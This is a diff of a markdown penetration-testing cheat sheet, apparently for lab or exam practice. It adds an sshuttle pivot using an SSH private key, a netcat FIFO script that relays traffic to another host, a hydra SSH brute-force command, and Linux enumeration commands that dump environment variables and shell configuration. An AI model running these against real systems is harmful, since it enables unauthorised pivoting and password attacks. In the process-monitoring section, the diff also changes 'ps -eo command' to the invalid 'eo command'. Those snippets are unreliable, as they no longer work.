@@ -1488,6 +1488,40 @@ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
 smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 ```
 
+with id_rsa
+
+```c
+sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
+```
+
+##### FIFO
+
+```c
+#!/usr/bin/env bash
+
+set -e
+
+if [ $# != 3 ]; then
+
+        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2
+        exit 1
+fi
+
+FRONTPORT=$1
+BACKHOST=$2
+BACKPORT=$3
+
+FIFO=/tmp/backpipe
+
+trap 'echo "trapped."; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15
+
+mkfifo $FIFO
+while true; do
+        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO
+done
+rm -f $FIFO
+```
+
 ##### ssh.exe
 
 | System              | IP address     |
@@ -4902,6 +4936,7 @@ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
 hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://IP   //SSH Attack with user
+hydra -l USER -P wordlist  IP -t 4 ssh -V
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "PASSWORD" rdp://IP  //RDP Attack
 ```
 
@@ -7302,6 +7337,11 @@ ls -R /home
 ls -la /opt
 dpkg -l
 uname -a
+mount
+lsmod
+/sbin/modinfo libata
+cat .bashrc
+env
 ```
 
 ###### Methodology
@@ -7419,6 +7459,12 @@ find / -perm -4000 -ls 2>/dev/null
 find \-perm /4000 2>/dev/null
 ```
 
+Status as the root user 
+
+```c
+aa-status
+```
+
 Privileges
 
 ```c
@@ -7478,7 +7524,8 @@ What is running?
 ```c
 ps -ef
 ps -ef | grep root
-ps aux 
+ps aux
+ps -u -C PROGRAM
 ```
 
 ```c
@@ -8255,7 +8302,7 @@ chmod +x FILE
 Find cron jobs
 
 ```c
-ps -eo command
+eo command
 ```
 
 Running tasks
@@ -8265,7 +8312,7 @@ set IFS=$'\n'
 ```
 
 ```c
-for i in $(ps -eo command); do echo $i; done
+for i in $(eo command); do echo $i; done
 ```
  
 ```c
@@ -8276,10 +8323,10 @@ cat /etc/crontab
 #!/bin/bash
 
 IFS=$'\n'
-old_process=$(ps -eo command)
+old_process=$(eo command)
 
 while true; do
-        new_process=(ps -eo command)
+        new_process=(eo command)
         diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
         sleep 1
         old_process=$new_process
@@ -8289,15 +8336,15 @@ done
 ```c
 #!/bin/bash
 
-old_process = $(ps -eo command)
+old_process = $(eo command)
 while true; do 
-        new_process=$(ps -eo command)
+        new_process=$(eo command)
         diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
         old_process=$new_porcess
 done
 ``
 
-Use of pspy
+Use of pspy to monitor linux process
 
 ```c
 ./pspy
